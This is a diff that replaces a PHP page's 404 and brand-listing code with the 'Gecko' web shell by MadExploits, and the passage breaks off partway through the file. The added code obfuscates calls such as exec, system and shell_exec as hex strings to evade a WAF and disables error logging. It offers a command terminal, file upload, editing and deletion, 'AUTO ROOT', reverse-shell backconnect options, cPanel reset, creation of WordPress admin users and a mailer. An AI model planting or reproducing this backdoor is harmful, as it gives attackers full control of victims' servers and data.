@@ -1,1977 +1,1705 @@
 <?php
+session_start();
+date_default_timezone_set("Asia/Jakarta");
 
-function homepage()
+// Konfigurasi
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+
+// Fungsi untuk tampilan halaman login
+function show_login_page($message = "")
 {
-  header("HTTP/1.0 404 Not Found");
-  echo "<h1><strong>404 Not Found</strong></h1>";
+?>
+    <!DOCTYPE html>
+    <html>
+    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body {
+                font-family: monospace;
+            }
+
+            input[type="password"] {
+                border: none;
+                border-bottom: 1px solid black;
+                padding: 2px;
+            }
+
+            input[type="password"]:focus {
+                outline: none;
+            }
+
+            input[type="submit"] {
+                border: none;
+                padding: 4.5px 20px;
+                background-color: #2e313d;
+                color: #FFF;
+            }
+        </style>
+    </head>
+
+    <body>
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
+            </div>
+        </form>
+    </body>
+
+    </html>
+
+    </html>
+<?php
+    exit;
 }
 
-if (isset($_GET['menu'])) {
-    $filename = "list.txt";
-    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['menu']);
-    foreach ($lines as $item) {
-        if (strtolower($item) === $target_string) {
-            $BRAND = strtoupper($target_string);
-        }
+if (!isset($_SESSION['authenticated'])) {
+    $stored_hashed_password = '$2y$10$GOcG1Q2pGVhm6aN9S97wqup57ZZ6kSeyPXshTvr6FiV7d4Yhbn4Mu'; 
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        show_login_page();
     }
-    if (isset($BRAND)) {
-        $BRANDS = $BRAND;
-        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-        if (isset($fullUrl)) {
-            $parsedUrl = parse_url($fullUrl);
-            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
-            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
-            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
-            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
-            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
-            $urlPath = $baseUrl;
+}
+?>
+<?php
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+# function WAF
+
+$Array = [
+    '676574637764', # ge  tcw d => 0
+    '676c6f62', # gl ob => 1
+    '69735f646972', # is_d ir => 2
+    '69735f66696c65', # is_ file => 3
+    '69735f7772697461626c65', # is_wr iteable => 4
+    '69735f7265616461626c65', # is_re adble => 5
+    '66696c657065726d73', # fileper ms => 6
+    '66696c65', # f ile => 7
+    '7068705f756e616d65', # php_unam e => 8
+    '6765745f63757272656e745f75736572', # getc urrentuser => 9
+    '68746d6c7370656369616c6368617273', # html special => 10
+    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
+    '6d6b646972', # mk dir => 12
+    '746f756368', # to uch => 13
+    '6368646972', # ch dir => 14
+    '72656e616d65', # ren ame => 15
+    '65786563', # exe c => 16
+    '7061737374687275', # pas sthru => 17
+    '73797374656d', # syst em => 18
+    '7368656c6c5f65786563', # sh ell_exec => 19
+    '706f70656e', # p open => 20
+    '70636c6f7365', # pcl ose => 21
+    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
+    '70726f635f6f70656e', # p roc_open => 23
+    '756e6c696e6b', # un link => 24
+    '726d646972', # rmd ir => 25
+    '666f70656e', # fop en => 26
+    '66636c6f7365', # fcl ose => 27
+    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
+    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
+    '63686d6f64', # ch mod => 30
+    '7379735f6765745f74656d705f646972', # temp _dir => 31
+    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
+    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
+];
+$hitung_array = count($Array);
+for ($i = 0; $i < $hitung_array; $i++) {
+    $fungsi[] = unx($Array[$i]);
+}
+
+if (isset($_GET['d'])) {
+    $cdir = unx($_GET['d']);
+    $fungsi[14]($cdir);
+} else {
+    $cdir = $fungsi[0]();
+}
+
+function file_ext($file)
+{
+    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
+        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
+    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
+        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
+    } else if (mime_content_type($file) == 'text/javascript') {
+        return '<i class="fa-brands fa-square-js"></i>';
+    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
+        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
+    } else if (mime_content_type($file) == 'text/plain') {
+        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
+    } else if (mime_content_type($file) == 'application/pdf') {
+        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
+    } else {
+        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
+    }
+}
+
+function download($file)
+{
+
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . basename($file));
+        header('Content-Transfer-Encoding: binary');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        ob_clean();
+        flush();
+        readfile($file);
+        exit;
+    }
+}
+
+if ($_GET['don'] == true) {
+    $FilesDon = download(unx($_GET['don']));
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
+    <script src="https://kit.fontawesome.com/057b9b510c.js" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
+    <style>
+        @media screen and (min-width: 768px) and (max-width: 1200px) and (min-height:720px) {
+            .code-editor-container {
+                height: 85vh !important;
+            }
+
+            .CodeMirror {
+                height: 72vh !important;
+                font-size: xx-large !important;
+                margin: 0 4px;
+                border-radius: 4px;
+            }
+
+            .btn-modal-close {
+                padding: 15px 40px !important;
+            }
+        }
+
+        .btn-submit,
+        a {
+            text-decoration: none;
+            color: #fff
+        }
+
+        a,
+        body {
+            color: #fff
+        }
+
+        .btn-submit,
+        .form-file,
+        tbody tr:nth-child(2n) {
+            background-color: #22242d
+        }
+
+        .code-editor,
+        .modal,
+        .terminal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0
+        }
+
+        .code-editor-body textarea,
+        .terminal-body textarea {
+            width: 98.5%;
+            height: 400px;
+            font-size: smaller;
+            resize: none
+        }
+
+        .menu-tools li,
+        .terminal-body li,
+        .terminal-head li {
+            display: inline-block
+        }
+
+        body {
+            background-color: #0e0f17;
+            font-family: monospace
+        }
+
+        .btn-modal-close:hover,
+        .btn-submit:hover,
+        .menu-file-manager ul,
+        .path-pwd,
+        thead {
+            background-color: #2e313d
+        }
+
+        ul {
+            list-style: none
+        }
+
+        .menu-header li {
+            padding: 5px 0
+        }
+
+        .menu-header ul li {
+            font-weight: 700;
+            font-style: italic
+        }
+
+        .btn-submit {
+            padding: 7px 25px;
+            border: 2px solid grey;
+            border-radius: 4px
+        }
+
+        .form-file,
+        a:hover {
+            color: #c5c8d6
+        }
+
+        .btn-submit:hover {
+            border: 2px solid #c5c8d6
+        }
+
+        .form-upload {
+            margin: 10px 0
+        }
+
+        .form-file {
+            border: 2px solid grey;
+            padding: 7px 20px;
+            border-radius: 4px
+        }
+
+        .menu-tools {
+            width: 95%
+        }
+
+        .menu-tools li {
+            margin: 15px 0
+        }
+
+        .menu-file-manager,
+        .modal-mail-text {
+            margin: 10px 40px
+        }
+
+        .menu-file-manager li {
+            display: inline-block;
+            margin: 15px 20px
+        }
+
+        .menu-file-manager li a::after {
+            content: "";
+            display: block;
+            border-bottom: 1px solid #fff
+        }
+
+        .path-pwd {
+            padding: 15px 0;
+            margin: 5px 0
+        }
+
+        table {
+            border-radius: 5px
+        }
+
+        thead {
+            height: 35px
+        }
+
+        tbody tr td {
+            padding: 10px 0
+        }
+
+        tbody tr td:nth-child(2),
+        tbody tr td:nth-child(3),
+        tbody tr td:nth-child(4) {
+            text-align: center
+        }
+
+        ::-webkit-scrollbar {
+            width: 16px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0e0f17
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #22242d;
+            border: 2px solid #555;
+            border-radius: 4px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555
+        }
+
+        ::-webkit-file-upload-button {
+            display: none
+        }
+
+        .modal {
+            display: none;
+            z-index: 2;
+            width: 100%;
+            background-color: rgba(0, 0, 0, .3)
+        }
+
+        .modal-container {
+            animation-name: modal-pop-out;
+            animation-duration: .7s;
+            animation-fill-mode: both;
+            margin: 10% auto auto;
+            border-radius: 10px;
+            width: 800px;
+            background-color: #f4f4f9
+        }
+
+        @keyframes modal-pop-out {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        .modal-header {
+            color: #000;
+            margin-left: 30px;
+            padding: 10px
+        }
+
+        .modal-body,
+        .terminal-head li {
+            color: #000
+        }
+
+        .modal-create-input {
+            width: 700px;
+            padding: 10px 5px;
+            background-color: #f4f4f9;
+            margin: 0 5%;
+            border: none;
+            border-radius: 4px;
+            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
+            border-bottom: 2px solid #0e0f17
+        }
+
+        .box-shadow {
+            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
+        }
+
+        .btn-modal-close {
+            background-color: #22242d;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 35px
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after {
+            padding: 5px;
+            border-radius: 5px;
+            margin-left: 110px;
+            background-color: #2e313d
+        }
+
+        .modal-btn-form {
+            margin: 15px 0;
+            padding: 10px;
+            text-align: right
+        }
+
+        .file-size {
+            color: orange
+        }
+
+        .badge-root::after {
+            content: "root";
+            display: block;
+            position: absolute;
+            width: 40px;
+            text-align: center;
+            margin-top: -30px;
+            margin-left: 110px;
+            border-radius: 4px;
+            background-color: red
+        }
+
+        .badge-premium::after {
+            content: "soon!";
+            display: block;
+            position: absolute;
+            width: 40px;
+            text-align: center;
+            margin-top: -30px;
+            margin-left: 140px;
+            border-radius: 4px;
+            background-color: red
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after,
+        .badge-linux::after,
+        .badge-windows::after {
+            width: 60px;
+            text-align: center;
+            margin-top: -30px;
+            display: block;
+            position: absolute
+        }
+
+        .badge-windows::after {
+            background-color: orange;
+            color: #000;
+            margin-left: 100px;
+            border-radius: 4px;
+            content: "windows"
+        }
+
+        .badge-linux::after {
+            margin-left: 100px;
+            border-radius: 4px;
+            background-color: #0047a3;
+            content: "linux"
+        }
+
+        .badge-action-editor:hover::after {
+            content: "Rename"
+        }
+
+        .badge-action-chmod:hover::after {
+            content: "Chmod"
+        }
+
+        .badge-action-download:hover::after {
+            content: "Download"
+        }
+
+        .CodeMirror {
+            height: 70vh;
+        }
+
+        .code-editor,
+        .terminal {
+            background-color: rgba(0, 0, 0, .3);
+            width: 100%
+        }
+
+        .code-editor-container {
+            background-color: #f4f4f9;
+            color: #000;
+            width: 90%;
+            height: 90vh;
+            margin: 20px auto auto;
+            border-radius: 10px
+        }
+
+        .code-editor-head {
+            padding: 15px;
+            font-weight: 700
+        }
+
+        .terminal-container {
+            animation: .5s both modal-pop-out;
+            width: 90%;
+            background-color: #f4f4f9;
+            margin: 25px auto auto;
+            color: #000;
+            border-radius: 4px
+        }
+
+        .bc-gecko,
+        .mail,
+        .terminal-input {
+            background-color: #22242d;
+            color: #fff
+        }
+
+        .terminal-head {
+            padding: 8px
+        }
+
+        .terminal-head li a {
+            color: #000;
+            position: absolute;
+            right: 0;
+            margin-right: 110px;
+            font-weight: 700;
+            margin-top: -20px;
+            font-size: 25px;
+            padding: 1px 10px
+        }
+
+        .terminal-body textarea {
+            margin: 4px;
+            background-color: #22242d;
+            color: #29db12;
+            border-radius: 4px
+        }
+
+        .active {
+            display: block
+        }
+
+        .terminal-input {
+            width: 500px;
+            padding: 6px;
+            border: 1px solid #22242d;
+            border-radius: 4px;
+            margin: 5px 0
+        }
+
+        .bc-gecko {
+            border: none;
+            padding: 7px 10px;
+            width: 712px;
+            border-radius: 5px;
+            margin: 15px 40px
+        }
+
+        .mail {
+            width: 705px;
+            resize: none;
+            height: 100px
+        }
+
+        .logo-gecko {
+            position: absolute;
+            top: -90px;
+            right: 40px;
+            z-index: -1;
+            bottom: 0
+        }
+    </style>
+</head>
+
+<body>
+    <div class="menu-header">
+        <ul>
+            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
+            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
+            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
+            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
+            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
+            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
+            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
+            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
+            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
+                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
+            </form>
+        </ul>
+    </div>
+    <div class="menu-tools">
+        <ul>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
+            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i class="fa-solid fa-flask"></i> Linux Exploit</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
+            <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
+            <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
+            <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> PHP Mailer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
+            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
+            <li><a href="//github.com/MadExploits/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
+        </ul>
+    </div>
+
+    <?php
+
+    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
+    $get_cwd = $fungsi[0]();
+    ?>
+
+    <div class="menu-file-manager">
+        <ul>
+            <li><a href="" id="create_folder">+ Create Folder</a></li>
+            <li><a href="" id="create_file">+ Create File</a></li>
+        </ul>
+        <div class="path-pwd">
+            <?php
+            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
+            $pwd = explode("/", $cwd);
+            if (stristr(PHP_OS, "WIN")) {
+                windowsDriver();
+            }
+            foreach ($pwd as $id => $val) {
+                if ($val == '' && $id == 0) {
+                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
+                    continue;
+                }
+                if ($val == '') continue;
+                echo '<a href="?d=';
+                for ($i = 0; $i <= $id; $i++) {
+                    echo hx($pwd[$i]);
+                    if ($i != $id) echo hx("/");
+                }
+                echo '">' . $val . ' / ' . '</a>';
+            }
+            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
+            ?>
+        </div>
+        </ul>
+        <table style="width: 100%;">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Permission</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <form action="" method="post">
+                <tbody>
+                    <!-- Gecko Folder File Manager -->
+                    <?php foreach ($file_manager as $_D) : ?>
+                        <?php if ($fungsi[2]($_D)) : ?>
+                            <tr>
+                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
+                                <td>[ DIR ]</td>
+                                <td>
+                                    <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="#00ff00">';
+                                    } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="red">';
+                                    }
+                                    echo perms($fungsi[0]() . '/' . $_D);
+                                    ?>
+                                </td>
+                                <!-- Action Folder Manager -->
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
+                            </tr>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                    <!-- Gecko Files Manager -->
+                    <?php foreach ($file_manager as $_F) : ?>
+                        <?php if ($fungsi[3]($_F)) : ?>
+                            <tr>
+                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a></td>
+                                <td><?= formatSize(filesize($_F)); ?></td>
+                                <td>
+                                    <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="#00ff00">';
+                                    } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
+                                        echo '<font color="red">';
+                                    }
+                                    echo perms($fungsi[0]() . '/' . $_F);
+                                    ?>
+                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                </tbody>
+        </table>
+        <br>
+        <select name="gecko-select" class="btn-submit">
+            <option value="delete">Delete</option>
+            <option value="unzip">Unzip</option>
+            <option value="zip">Zip</option><br>
+        </select>
+        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
+        </form>
+
+        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
+        <div class="modal">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div id="modal-body-bc"></div>
+                        <span id="modal-input"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
+                        </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    </div>
+    <?php if (isset($_GET['cpanelreset'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: Cpanel Reset </i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <input type="email" name="resetcp" class="modal-create-input" placeholder="Your email : example@mail.com">
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if (isset($_GET['createwp'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">
+                                <center>CREATE WORDPRESS ADMIN PASSWORD</center>
+                            </i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <input type="text" name="db_name" class="modal-create-input" placeholder="DB_NAME">
+                                <br><br>
+                                <input type="text" name="db_user" class="modal-create-input" placeholder="DB_USER">
+                                <br><br>
+                                <input type="text" name="db_password" class="modal-create-input" placeholder="DB_PASSWORD">
+                                <br><br>
+                                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1">
+                                <br><br>
+                                <hr size="2" color="black" style="margin:0px 30px; border-radius:3px;">
+                                <br><br>
+                                <input type="text" name="wp_user" class="modal-create-input" placeholder="Your Username">
+                                <br><br>
+                                <input type="text" name="wp_pass" class="modal-create-input" placeholder="Your Password">
+                                <br><br>
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submitwp" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if (isset($_GET['backconnect'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: Backconnect</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <select class="bc-gecko box-shadow" name="gecko-bc">
+                            <option value="-">Choose Backconnect</option>
+                            <option value="perl">Perl</option>
+                            <option value="python">Python</option>
+                            <option value="ruby">Ruby</option>
+                            <option value="bash">Bash</option>
+                            <option value="php">php</option>
+                            <option value="nc">nc</option>
+                            <option value="sh">sh</option>
+                            <option value="xterm">Xterm</option>
+                            <option value="golang">Golang</option>
+                        </select>
+                        <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1">
+                        <br><br>
+                        <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if (isset($_GET['mailer'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: PHP Mailer</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <div class="modal-mail-text">
+                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
+                                </div>
+                                <br>
+                                <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
+                                <br><br>
+                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
+                                <br><br>
+                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['f']) : ?>
+        <div class="code-editor">
+            <div class="code-editor-container">
+                <div class="code-editor-head">
+                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
+                </div>
+                <div class="code-editor-body">
+                    <form action="" method="post">
+                        <textarea name="code-editor" id="code" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "normal") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
+                </div>
+                <div class="terminal-body">
+                    <textarea class="box-shadow" disabled><?php
+                                                            if (isset($_POST['terminal'])) {
+                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
+                                                            }
+                                                            ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "root") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
